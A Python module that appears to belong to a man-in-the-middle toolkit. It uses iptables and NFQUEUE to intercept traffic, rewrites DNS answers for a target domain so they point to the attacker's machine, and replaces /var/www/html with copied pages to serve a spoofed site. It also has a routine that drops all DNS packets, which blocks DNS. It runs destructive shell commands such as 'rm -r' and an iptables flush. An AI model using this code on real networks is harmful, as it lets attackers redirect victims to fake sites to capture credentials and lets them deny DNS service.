import scapy.all as scapy
import netfilterqueue
import subprocess
from colorama import Fore
import sys
from arp_spoof import restore


def enable_ip_forward():
    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)


# Set up iptables rules for DNS spoofing
def start_dns_spoof():
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 1", shell=True)
    subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 1", shell=True)


# Reset iptables rules after DNS spoofing attack
def stop_dns_spoof():
    subprocess.call("iptables --flush", shell=True)


# Perform DNS spoofing
def dns_spoof(target_domain, spoof_ip, args):
    def process_packet(packet):
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.DNSRR) and scapy_packet.haslayer(scapy.UDP):
            qname = scapy_packet[scapy.DNSQR].qname
            if target_domain.decode() in qname.decode():
                print(Fore.RED + "[+] Spoofing target" + Fore.RESET)
                answer = scapy.DNSRR(rrname=qname, rdata=args.local_ip)
                scapy_packet[scapy.DNS].an = answer
                scapy_packet[scapy.DNS].ancount = 1

                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].len
                del scapy_packet[scapy.UDP].chksum

                packet.set_payload(bytes(scapy_packet))

        packet.accept()

    queue = netfilterqueue.NetfilterQueue()
    queue.bind(1, process_packet)
    try:
        queue.run()
    except KeyboardInterrupt:
        print(Fore.RED + "\n[+] Stopping the program..." + Fore.RESET)
        restore(args.target_ip, args.router_ip)
        print(Fore.RED + "\n[+] Target IP Table restored." + Fore.RESET)
        stop_dns_spoof()
        sys.exit(0)

    # finally:
        # stop_dns_spoof()
    # print("[+] IPTables flushed. DNS Spoofing stopped.")


# Copy HTML files to /var/www/html for web page spoofing
def move_html_file(domain):
    subprocess.call("rm -r /var/www/html", shell=True)
    subprocess.call(f"cp -r {domain}/html /var/www/html", shell=True)
    subprocess.call("chown -R www-data:www-data /var/www/html", shell=True)


# Drop DNS packets
def dns_drop():
    def process_packet(packet):
        packet.drop()

    queue = netfilterqueue.NetfilterQueue()
    queue.bind(1, process_packet)
    queue.run()
